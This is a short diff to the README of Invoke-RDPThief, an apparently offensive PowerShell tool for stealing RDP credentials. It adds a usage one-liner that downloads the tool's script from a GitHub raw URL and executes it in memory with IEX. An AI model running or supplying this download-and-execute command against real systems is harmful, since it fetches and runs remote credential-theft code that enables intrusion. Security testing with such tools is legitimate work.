@@ -29,7 +29,7 @@ Shellgen: https://github.com/Leo4j/ShellGen
 # Usage
 ```powershell
 # Load into memory and execute
-IEX(New-Object System.Net.WebClient).DownloadString("")
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-RDPThief/refs/heads/main/Invoke-RDPThief.ps1")
 
 ```
 ## Output
